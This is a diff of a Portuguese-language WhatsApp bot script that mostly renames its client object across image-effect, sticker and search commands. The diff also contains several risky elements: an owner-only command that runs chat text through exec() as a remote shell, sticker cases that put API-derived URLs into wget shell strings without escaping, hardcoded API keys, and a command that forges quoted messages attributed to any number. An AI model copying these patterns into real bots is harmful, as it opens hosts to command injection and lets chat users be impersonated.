@@ -6347,9 +5778,9 @@ if (isBanned) return reply(mess.only.benned)
 reply(mess.wait)
 anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/ppcouple?apikey=dappakntlll`) 
 cowo = await getBuffer(anu.result.male)
-tomioka.sendMessage(from, cowo, image, {quoted: ftoko})
+client.sendMessage(from, cowo, image, {quoted: ftoko ,contextInfo: tomis})
 cewe = await getBuffer(anu.result.female)
-tomioka.sendMessage(from, cewe, image, {quoted: ftoko})
+client.sendMessage(from, cewe, image, {quoted: ftoko ,contextInfo: tomis})
 break
 case 'gtav':
 addFilter(from)  
@@ -6357,13 +5788,13 @@ var imgbb = require('imgbb-uploader')
 if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
 ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
 reply(mess.wait)                 
-owgi = await tomioka.downloadAndSaveMediaMessage(ger)
+owgi = await client.downloadAndSaveMediaMessage(ger)
 anu = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
 imgtrg = `${anu.display_url}`
 anu1 = await fetchJson(`https://api-gdr2.herokuapp.com/api/photooxy/gtav?url=${imgtrg}`)
 if (anu1.error) return reply("Não consegui detectar nenhum rosto")
 nobg = await getBuffer(anu1.result.url)
-tomioka.sendMessage(from, nobg, image, {
+client.sendMessage(from, nobg, image, {
 quoted: mek
 })
 } else {
@@ -6376,13 +5807,13 @@ var imgbb = require('imgbb-uploader')
 if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
 ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
 reply(mess.wait)                 
-owgi = await tomioka.downloadAndSaveMediaMessage(ger)
+owgi = await client.downloadAndSaveMediaMessage(ger)
 anu = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
 imgtrg = `${anu.display_url}`
 anu1 = await fetchJson(`https://jonaz-api-v2.herokuapp.com/zombie?url=${imgtrg}`)
 if (anu1.error) return reply("Não consegui detectar nenhum rosto")
 nobg = await getBuffer(anu1.resultado)
-tomioka.sendMessage(from, nobg, image, {
+client.sendMessage(from, nobg, image, {
 quoted: mek
 })
 } else {
@@ -6395,13 +5826,13 @@ var imgbb = require('imgbb-uploader')
 if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
 ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
 reply(mess.wait)                 
-owgi = await tomioka.downloadAndSaveMediaMessage(ger)
+owgi = await client.downloadAndSaveMediaMessage(ger)
 anu = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
 imgtrg = `${anu.display_url}`
 anu1 = await fetchJson(`https://api-gdr2.herokuapp.com/api/photooxy/fireAnimation?url=${imgtrg}`)
 if (anu1.error) return reply("Não consegui detectar nenhum rosto")
 nobg = await getBuffer(anu1.result.url)
-tomioka.sendMessage(from, nobg, image, {
+client.sendMessage(from, nobg, image, {
 quoted: mek
 })
 } else {
@@ -6414,13 +5845,13 @@ var imgbb = require('imgbb-uploader')
 if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
 ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
 reply(mess.wait)                 
-owgi = await tomioka.downloadAndSaveMediaMessage(ger)
+owgi = await client.downloadAndSaveMediaMessage(ger)
 anu = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
 imgtrg = `${anu.display_url}`
 anu1 = await fetchJson(`https://api-gdr2.herokuapp.com/api/photooxy/brokemirror?url=${imgtrg}`)
 if (anu1.error) return reply("Não consegui detectar nenhum rosto")
 nobg = await getBuffer(anu1.result.url)
-tomioka.sendMessage(from, nobg, image, {
+client.sendMessage(from, nobg, image, {
 quoted: mek
 })
 } else {
@@ -6433,13 +5864,13 @@ var imgbb = require('imgbb-uploader')
 if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
 ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
 reply(mess.wait)                 
-owgi = await tomioka.downloadAndSaveMediaMessage(ger)
+owgi = await client.downloadAndSaveMediaMessage(ger)
 anu = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
 imgtrg = `${anu.display_url}`
 anu1 = await fetchJson(`https://api-gdr2.herokuapp.com/api/photooxy/artePhoto?url=${imgtrg}`)
 if (anu1.error) return reply("Não consegui detectar nenhum rosto")
 nobg = await getBuffer(anu1.result.url)
-tomioka.sendMessage(from, nobg, image, {
+client.sendMessage(from, nobg, image, {
 quoted: mek
 })
 } else {
@@ -6452,13 +5883,13 @@ var imgbb = require('imgbb-uploader')
 if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
 ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
 reply(mess.wait)                 
-owgi = await tomioka.downloadAndSaveMediaMessage(ger)
+owgi = await client.downloadAndSaveMediaMessage(ger)
 anu = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
 imgtrg = `${anu.display_url}`
 anu1 = await fetchJson(`http://brizas-api.herokuapp.com/photooxy/v2/crossgun?apikey=brizaloka&img=${imgtrg}`)
 if (anu1.error) return reply("Não consegui detectar nenhum rosto")
 nobg = await getBuffer(anu1.resultado)
-tomioka.sendMessage(from, nobg, image, {
+client.sendMessage(from, nobg, image, {
 quoted: mek
 })
 } else {
@@ -6471,13 +5902,13 @@ var imgbb = require('imgbb-uploader')
 if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
 ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
 reply(mess.wait)     
-owgi = await tomioka.downloadAndSaveMediaMessage(ger)
+owgi = await client.downloadAndSaveMediaMessage(ger)
 anu = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
 imgtrg = `${anu.display_url}`
 anu1 = await fetchJson(`http://brizas-api.herokuapp.com/photooxy/v2/gunscircle?apikey=brizaloka&text=Bandido(a)&text2=da área&img=${imgtrg}`)
 if (anu1.error) return reply("Não consegui detectar nenhum rosto")
 nobg = await getBuffer(anu1.resultado)
-tomioka.sendMessage(from, nobg, image, {quoted: mek})
+client.sendMessage(from, nobg, image, {quoted: mek})
 } else {
 reply('Você precisa marcar ou enviar uma imagem para isso')
 }
@@ -6488,13 +5919,13 @@ var imgbb = require('imgbb-uploader')
 if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
 ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
 reply(mess.wait)     
-owgi = await tomioka.downloadAndSaveMediaMessage(ger)
+owgi = await client.downloadAndSaveMediaMessage(ger)
 anu = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
 imgtrg = `${anu.display_url}`
 anu1 = await fetchJson(`https://leyscoders-api.herokuapp.com/api/imgmaker/firework?url=${imgtrg}&apikey=dappakntlll`)
 if (anu1.error) return reply("Não consegui detectar nenhum rosto")
 nobg = await getBuffer(anu1.result.url)
-tomioka.sendMessage(from, nobg, video, {quoted: mek, mimetype: 'video/mp4'})
+client.sendMessage(from, nobg, video, {quoted: mek, mimetype: 'video/mp4'})
 } else {
 reply('Você precisa marcar ou enviar uma imagem para isso')
 }
@@ -6506,13 +5937,13 @@ var imgbb = require('imgbb-uploader')
 if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
 ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
 reply(mess.wait)                 
-owgi = await tomioka.downloadAndSaveMediaMessage(ger)
+owgi = await client.downloadAndSaveMediaMessage(ger)
 anu = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
 imgtrg = `${anu.display_url}`
 anu1 = await fetchJson(`https://api-gdr2.herokuapp.com/api/photooxy/mixGalaxy?url=${imgtrg}`)
 if (anu1.error) return reply("Não consegui detectar nenhum rosto")
 nobg = await getBuffer(anu1.result.url)
-tomioka.sendMessage(from, nobg, image, {
+client.sendMessage(from, nobg, image, {
 quoted: mek
 })
 } else {
@@ -6523,9 +5954,9 @@ case 'acess':
 if (!isOwner) return reply(mess.only.ownerB)
 teks = body.slice(7)
 exec(teks, (err, stdout) => {
-if (err) return tomioka.sendMessage(from, `root@ALEATORY-BOT:~ ${err}`, text, { quoted: mek })
+if (err) return client.sendMessage(from, `root@ALEATORY-BOT:~ ${err}`, text, { quoted: mek })
 if (stdout) {
-tomioka.sendMessage(from, stdout, text)
+client.sendMessage(from, stdout, text)
 }
 })
 break
@@ -6535,13 +5966,13 @@ var imgbb = require('imgbb-uploader')
 if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
 ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
 reply(mess.wait)                 
-owgi = await tomioka.downloadAndSaveMediaMessage(ger)
+owgi = await client.downloadAndSaveMediaMessage(ger)
 anu = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
 imgtrg = `${anu.display_url}`
 anu1 = await fetchJson(`https://api-gdr2.herokuapp.com/api/photooxy/cuboFoto1?url=${imgtrg}`)
 if (anu1.error) return reply("Não consegui detectar nenhum rosto")
 nobg = await getBuffer(anu1.result.url)
-tomioka.sendMessage(from, nobg, image, {
+client.sendMessage(from, nobg, image, {
 quoted: mek
 })
 } else {
@@ -6554,13 +5985,13 @@ var imgbb = require('imgbb-uploader')
 if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
 ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
 reply(mess.wait)                 
-owgi = await tomioka.downloadAndSaveMediaMessage(ger)
+owgi = await client.downloadAndSaveMediaMessage(ger)
 anu = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
 imgtrg = `${anu.display_url}`
 anu1 = await fetchJson(`http://brizas-api.herokuapp.com/photooxy/v2/phonewallpaper?apikey=brizaloka&img=${imgtrg}`)
 if (anu1.error) return reply("Não consegui detectar nenhum rosto")
 nobg = await getBuffer(anu1.resultado)
-tomioka.sendMessage(from, nobg, image, {
+client.sendMessage(from, nobg, image, {
 quoted: mek
 })
 } else {
@@ -6574,13 +6005,13 @@ var imgbb = require('imgbb-uploader')
 if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
 ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
 reply(mess.wait)                 
-owgi = await tomioka.downloadAndSaveMediaMessage(ger)
+owgi = await client.downloadAndSaveMediaMessage(ger)
 anu = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
 imgtrg = `${anu.display_url}`
 anu1 = await fetchJson(`https://api-gdr2.herokuapp.com/api/photooxy/puzzle?url=${imgtrg}`)
 if (anu1.error) return reply("Não consegui detectar nenhum rosto")
 nobg = await getBuffer(anu1.result.url)
-tomioka.sendMessage(from, nobg, image, {
+client.sendMessage(from, nobg, image, {
 quoted: mek
 })
 } else {
@@ -6594,7 +6025,7 @@ var imgbb = require('imgbb-uploader')
 if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
 ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
 reply('Estou fazendo, espere')                     
-owgi = await tomioka.downloadAndSaveMediaMessage(ger)
+owgi = await client.downloadAndSaveMediaMessage(ger)
 lfy = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
 imgtrg = `${lfy.display_url}`
 ranp = getRandom('.gif')
@@ -6604,7 +6035,7 @@ exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps
 fs.unlinkSync(ranp)
 if (err) return reply(`DEU ERROR 😞`)
 nobg = fs.readFileSync(rano)
-tomioka.sendMessage(from, nobg, sticker, {quoted: mek})
+client.sendMessage(from, nobg, sticker, {quoted: mek})
 fs.unlinkSync(rano)
 })
 } else {
@@ -6618,7 +6049,7 @@ var imgbb = require('imgbb-uploader')
 if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
 ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
 reply(mess.wait)
-owgi = await tomioka.downloadAndSaveMediaMessage(ger)
+owgi = await client.downloadAndSaveMediaMessage(ger)
 fgh = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
 imgtrg = `${fgh.display_url}`
 ranp = getRandom('.gif')
@@ -6628,7 +6059,7 @@ exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps
 fs.unlinkSync(ranp)
 if (err) return reply(`DEU ERROR 😞`)
 nobg = fs.readFileSync(rano)
-tomioka.sendMessage(from, nobg, sticker, {quoted: mek
+client.sendMessage(from, nobg, sticker, {quoted: mek
 })
 fs.unlinkSync(rano)
 })
@@ -6643,7 +6074,7 @@ var imgbb = require('imgbb-uploader')
 if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
 ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
 reply('Estou fazendo, espere')                     
-owgi = await tomioka.downloadAndSaveMediaMessage(ger)
+owgi = await client.downloadAndSaveMediaMessage(ger)
 anu = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
 imgtrg = `${anu.display_url}`
 ranp = getRandom('.gif')
@@ -6653,7 +6084,7 @@ exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps
 fs.unlinkSync(ranp)
 if (err) return reply(`DEU ERROR 😞`)
 nobg = fs.readFileSync(rano)
-tomioka.sendMessage(from, nobg, sticker, {quoted: mek})
+client.sendMessage(from, nobg, sticker, {quoted: mek})
 fs.unlinkSync(rano)
 })
 } else {
@@ -6666,7 +6097,7 @@ var imgbb = require('imgbb-uploader')
 if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
 ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
 reply('Estou fazendo, espere')                     
-owgi = await tomioka.downloadAndSaveMediaMessage(ger)
+owgi = await client.downloadAndSaveMediaMessage(ger)
 qkl = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
 imgtrg = `${qkl.display_url}`
 ranp = getRandom('.gif')
@@ -6676,7 +6107,7 @@ exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps
 fs.unlinkSync(ranp)
 if (err) return reply(`DEU ERROR 😞`)
 nobg = fs.readFileSync(rano)
-tomioka.sendMessage(from, nobg, sticker, {quoted: mek})
+client.sendMessage(from, nobg, sticker, {quoted: mek})
 fs.unlinkSync(rano)
 })
 } else {
@@ -6690,7 +6121,7 @@ k = `${body.slice(10)}`
 txt1 = k.split("|")[0];
 txt2 = k.split("|")[1];
 txt3 = k.split("|")[2];
- tomioka.sendMessage(from, `${txt3}`,text,{quoted:{    key: {fromMe: false,participant: `${txt1}@s.whatsapp.net`,},message: { "extendedTextMessage": {"text": `${txt2}`,"title": `Hmm`}}}})
+ client.sendMessage(from, `${txt3}`,text,{quoted:{    key: {fromMe: false,participant: `${txt1}@s.whatsapp.net`,},message: { "extendedTextMessage": {"text": `${txt2}`,"title": `Hmm`}}}})
  break
 case 'triggered':
 addFilter(from)  
@@ -6698,7 +6129,7 @@ var imgbb = require('imgbb-uploader')
 if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
 ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
 reply('Estou fazendo, espere')                     
-owgi = await tomioka.downloadAndSaveMediaMessage(ger)
+owgi = await client.downloadAndSaveMediaMessage(ger)
 dsr = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
 imgtrg = `${dsr.display_url}`
 ranp = getRandom('.gif')
@@ -6708,7 +6139,7 @@ exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps
 fs.unlinkSync(ranp)
 if (err) return reply(`DEU ERROR 😞`)
 nobg = fs.readFileSync(rano)
-tomioka.sendMessage(from, nobg, sticker, {quoted: mek})
+client.sendMessage(from, nobg, sticker, {quoted: mek})
 fs.unlinkSync(rano)
 })
 } else {
@@ -6721,7 +6152,7 @@ var imgbb = require('imgbb-uploader')
 if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
 ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
 reply('Estou fazendo, espere')                     
-owgi = await tomioka.downloadAndSaveMediaMessage(ger)
+owgi = await client.downloadAndSaveMediaMessage(ger)
 qhy = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
 imgtrg = `${qhy.display_url}`
 ranp = getRandom('.gif')
@@ -6731,7 +6162,7 @@ exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps
 fs.unlinkSync(ranp)
 if (err) return reply(`DEU ERROR 😞`)
 nobg = fs.readFileSync(rano)
-tomioka.sendMessage(from, nobg, sticker, {quoted: mek})
+client.sendMessage(from, nobg, sticker, {quoted: mek})
 fs.unlinkSync(rano)
 })
 } else {
@@ -6744,7 +6175,7 @@ var imgbb = require('imgbb-uploader')
 if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
 ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
 reply('Estou fazendo, espere')                     
-owgi = await tomioka.downloadAndSaveMediaMessage(ger)
+owgi = await client.downloadAndSaveMediaMessage(ger)
 der = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
 imgtrg = `${der.display_url}`
 ranp = getRandom('.gif')
@@ -6754,7 +6185,7 @@ exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps
 fs.unlinkSync(ranp)
 if (err) return reply(`DEU ERROR 😞`)
 nobg = fs.readFileSync(rano)
-tomioka.sendMessage(from, nobg, sticker, {quoted: mek})
+client.sendMessage(from, nobg, sticker, {quoted: mek})
 fs.unlinkSync(rano)
 })
 } else {
@@ -6767,7 +6198,7 @@ var imgbb = require('imgbb-uploader')
 if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
 ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
 reply('Estou fazendo, espere')                     
-owgi = await tomioka.downloadAndSaveMediaMessage(ger)
+owgi = await client.downloadAndSaveMediaMessage(ger)
 lder = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
 imgtrg = `${lder.display_url}`
 ranp = getRandom('.gif')
@@ -6777,7 +6208,7 @@ exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps
 fs.unlinkSync(ranp)
 if (err) return reply(`DEU ERROR 😞`)
 nobg = fs.readFileSync(rano)
-tomioka.sendMessage(from, nobg, sticker, {quoted: mek})
+client.sendMessage(from, nobg, sticker, {quoted: mek})
 fs.unlinkSync(rano)
 })
 } else {
@@ -6790,7 +6221,7 @@ var imgbb = require('imgbb-uploader')
 if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
 ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
 reply('Estou fazendo, espere')                     
-owgi = await tomioka.downloadAndSaveMediaMessage(ger)
+owgi = await client.downloadAndSaveMediaMessage(ger)
 anu = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
 imgtrg = `${anu.display_url}`
 ranp = getRandom('.gif')
@@ -6800,7 +6231,7 @@ exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps
 fs.unlinkSync(ranp)
 if (err) return reply(`DEU ERROR 😞`)
 nobg = fs.readFileSync(rano)
-tomioka.sendMessage(from, nobg, sticker, {quoted: mek})
+client.sendMessage(from, nobg, sticker, {quoted: mek})
 fs.unlinkSync(rano)
 })
 } else {
@@ -6813,7 +6244,7 @@ var imgbb = require('imgbb-uploader')
 if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
 ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
 reply('Estou fazendo, espere')                     
-owgi = await tomioka.downloadAndSaveMediaMessage(ger)
+owgi = await client.downloadAndSaveMediaMessage(ger)
 anu = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
 imgtrg = `${anu.display_url}`
 ranp = getRandom('.gif')
@@ -6823,7 +6254,7 @@ exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps
 fs.unlinkSync(ranp)
 if (err) return reply(`DEU ERROR 😞`)
 nobg = fs.readFileSync(rano)
-tomioka.sendMessage(from, nobg, sticker, {quoted: mek})
+client.sendMessage(from, nobg, sticker, {quoted: mek})
 fs.unlinkSync(rano)
 })
 } else {
@@ -6832,13 +6263,13 @@ reply('Você precisa marcar ou enviar uma imagem para isso')
 break 
 //@Tio Tomioka YT					
 				case 'pokemon':
-                    tomioka.updatePresence(from, Presence.composing) 
+                    client.updatePresence(from, Presence.composing) 
 					data = await fetchJson(`https://api.fdci.se/rep.php?gambar=pokemon`, {method: 'get'})
 					return fakegroup (mess.wait)
 					n = JSON.parse(JSON.stringify(data));
 					nimek =  n[Math.floor(Math.random() * n.length)];
 					pok = await getBuffer(nimek)
-					tomioka.sendMessage(from, pok, image, { contextInfo: null, quoted: ftoko})
+					client.sendMessage(from, pok, image, { contextInfo: null, quoted: ftoko ,contextInfo: tomis})
                     
 					break
 case 'wolf':  
@@ -6846,7 +6277,7 @@ case 'wolf':
                    F = body.slice(6)
                    return fakegroup (mess.wait)
                    anu = await getBuffer(`https://api.zeks.xyz/api/wolflogo?apikey=TioTomioka&text1=rimurubotz&text2=${F}`)
-                   tomioka.sendMessage(from, anu, image, {caption: `Aqui está 😊`, quoted: mek})
+                   client.sendMessage(from, anu, image, {caption: `Aqui está 😊`, quoted: mek})
                    break    
 				case 'ytsearch':
 
@@ -6862,7 +6293,7 @@ case 'wolf':
 
    			} catch {
 
-        	return await tomioka.sendMessage(from, 'Error!', MessageType.text,)
+        	return await client.sendMessage(from, 'Error!', MessageType.text,)
 
     		}
 
@@ -6886,7 +6317,7 @@ case 'wolf':
 
     		ytresult += '◩ *Tomioka-self*'
 
-    		await tomioka.sendMessage(from, tbuff, image, {thumbnail: fs.readFileSync('./assets/foto.png'),quoted: mek, caption: ytresult})
+    		await client.sendMessage(from, tbuff, image, {thumbnail: fs.readFileSync('./assets/foto.png'),quoted: mek, caption: ytresult})
 
 			
 break
@@ -6897,7 +6328,7 @@ break
 					return fakegroup (mess.wait)
 					anu = await fetchJson(`http://melodicxt.herokuapp.com/api/txtcustom?theme=blue_metal&text=${tels}&apiKey=administrator`, {method: 'get'})
 					buff = await getBuffer(anu.result)
-					tomioka.sendMessage(from, buff, image, {quoted: mek})
+					client.sendMessage(from, buff, image, {quoted: mek})
 					break
 				case 'rize':
 					return fakegroup (mess.wait)
@@ -6905,7 +6336,7 @@ break
 					ri = JSON.parse(JSON.stringify(anu));
 					ze =  ri[Math.floor(Math.random() * ri.length)];
 					nye = await getBuffer(ze)
-					tomioka.sendMessage(from, nye, image, { caption: 'rize chan!!', contextInfo: null, quoted: ftoko})
+					client.sendMessage(from, nye, image, { caption: 'rize chan!!', contextInfo: null, quoted: ftoko ,contextInfo: tomis})
 					 	
 					break 
 				case 'mia':
@@ -6915,16 +6346,16 @@ break
 					ri = JSON.parse(JSON.stringify(anu));
 					ze =  ri[Math.floor(Math.random() * ri.length)];
 					nye = await getBuffer(ze)
-					tomioka.sendMessage(from, nye, image, { caption: 'i love you, mia 🥺❤️', contextInfo: null, quoted: ftoko})
+					client.sendMessage(from, nye, image, { caption: 'i love you, mia 🥺❤️', contextInfo: null, quoted: ftoko ,contextInfo: tomis})
 					 	
 					break 
 					case 'qrcode':
 					if (!isPremium) return fakegroup (mess.only.premium)
 				
 					const tex = encodeURIComponent(body.slice(8))
-					if (!tex) return tomioka.sendMessage(from, 'Digite um texto/url que deseja criar um código qr', text, {quoted: mek})
+					if (!tex) return client.sendMessage(from, 'Digite um texto/url que deseja criar um código qr', text, {quoted: mek})
 					const bufferr = await getBuffer(`https://api.qrserver.com/v1/create-qr-code/?size=500x500&data=${tex}`)
-					tomioka.sendMessage(from, bufferr, image, {quoted: mek})
+					client.sendMessage(from, bufferr, image, {quoted: mek})
 					break
 				case 'texteng':
 					if (args.length < 1) return fakegroup (mess.blank)
@@ -6933,7 +6364,7 @@ break
 					return fakegroup (mess.wait)
 					anu = await fetchJson(`http://melodicxt.herokuapp.com/api/txtcustom?theme=sand_engraved&text=${tels}&apiKey=administrator`, {method: 'get'})
 					buff = await getBuffer(anu.result)
-					tomioka.sendMessage(from, buff, image, {quoted: mek})
+					client.sendMessage(from, buff, image, {quoted: mek})
 					break
 				
 					case 'brainly':
@@ -6943,7 +6374,7 @@ break
 					for (let Y of res.data) {
 						teks += `\n*「 BRAINLY 」*\n\n*➸ Questão:* ${Y.pertanyaan}\n\n*➸ Resposta:* ${Y.jawaban[0].text}\n♡───────────♡\n`
 					}
-					tomioka.sendMessage(from, teks, text, {quoted: mek, detectLinks: false})
+					client.sendMessage(from, teks, text, {quoted: mek, detectLinks: false})
                         console.log(res)
                     })
 					
@@ -6954,25 +6385,18 @@ break
 						teks += `│+  @${V.split('@')[0]}\n`
 					}
 					teks += `│+ Total : ${premium.length}\n╰──────*「 *TOMIOKA BOT* 」`
-					tomioka.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": premium}})
+					client.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": premium}})
 					break
-             /*     case 'qrcode':
-        			if (!isPremium) return fakegroup (mess.only.premium)
-					const tex = encodeURIComponent(body.slice(8))
-					if (!tex) return tomioka.sendMessage(from, 'Digite um texto/url que deseja criar um código qr', text, {quoted: mek})
-					const bufferr = await getBuffer(`https://api.qrserver.com/v1/create-qr-code/?size=500x500&data=${tex}`)
-					tomioka.sendMessage(from, bufferr, image, {quoted: mek})
-					break*/
 		    	case 'wa.me':
 		        case 'wame':
 		
 		          if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
-                  tomioka.updatePresence(from, Presence.composing) 
+                  client.updatePresence(from, Presence.composing) 
                   options = {
                   text: `「 *LINK WHATSAPP* 」\n\n_Solicitado por_ : *@${sender.split("@s.whatsapp.net")[0]}*\n\nSeu link WhatsApp:\n\n*https://wa.me/${sender.split("@s.whatsapp.net")[0]}*\n\n*Ou*\n\n*https://api.whatsapp.com/send?phone=${sender.split("@")[0]}*\n\n*_TOMIOKABOT_*`,
                   contextInfo: { mentionedJid: [sender] }
                   }
-                  tomioka.sendMessage(from, options, text, { contextInfo: null, quoted: ftoko} )
+                  client.sendMessage(from, options, text, { contextInfo: null, quoted: ftoko ,contextInfo: tomis} )
 			      break
                   case 'playstore':
                 ps = `${body.slice(11)}`
@@ -6983,18 +6407,6 @@ break
                   }
                   reply(store.trim())
                   break
-            /*   case 'pornhub':
-			   return fakegroup (mess.wait)
-              	    if (args.length < 1) return fakegroup ('Cadê o texto, mano?')
-                    teks = body.slice(9)
-                    anu = await fetchJson(`https://api.arugaz.my.id/api/media/pornhub/search?query=${teks}`, {method: 'get'})
-                    teks = `===============\n`
-                    for (let bokep of anu.result) {
-                    teks += `Título: ${bokep.title}\nAtor: ${bokep.author}\nVisualizadores: *${bokep.views}*\nDuração: ${bokep.duration}\nLink: ${bokep.link}\n===============\n`
-                    }
-                    reply(teks.trim())
-			     	 
-			     	break  */
 			     case 'nekopoi':
 			   return fakegroup (mess.wait)
               	    if (args.length < 1) return fakegroup ('Cadê o texto, mano?')
@@ -7019,31 +6431,23 @@ break
 			     	break 
             case 'onichan':
             case 'bodoh':
-                tomioka.sendMessage(from, buff, './lindy/baka.mp3', audio/mp3, {quoted: mek, ptt:true})
+                client.sendMessage(from, buff, './lindy/baka.mp3', audio/mp3, {quoted: mek, ptt:true})
                 break
 				case 'hunti':
 					return fakegroup (mess.wait)
 					anu = await fetchJson(`https://api.vhtear.com/nhentaipdfdownload?query=287167&apikey={BELI APIKEY BIAR WORK DI 0816546638}`, {method: 'get'})
 					if (anu.error) return fakegroup (anu.error)
 					bufferjj = await getBuffer(anu.result.pdf_file)
